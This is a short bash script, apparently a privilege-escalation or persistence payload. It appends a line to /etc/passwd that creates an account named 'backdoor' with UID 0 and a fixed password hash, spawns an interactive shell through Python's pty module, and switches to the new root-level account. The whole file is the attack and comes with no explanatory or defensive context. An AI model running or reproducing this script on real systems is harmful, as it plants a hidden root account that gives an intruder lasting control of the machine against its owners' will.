#! /bin/bash
echo "backdoor:$1$backdoor$T9Vqpqol1TCMzm2rWMzSX.:0:0:/root/root:/bin/bash" >> /etc/passwd
python -c 'import pty; pty.spawn("/bin/bash")'
su backdoor
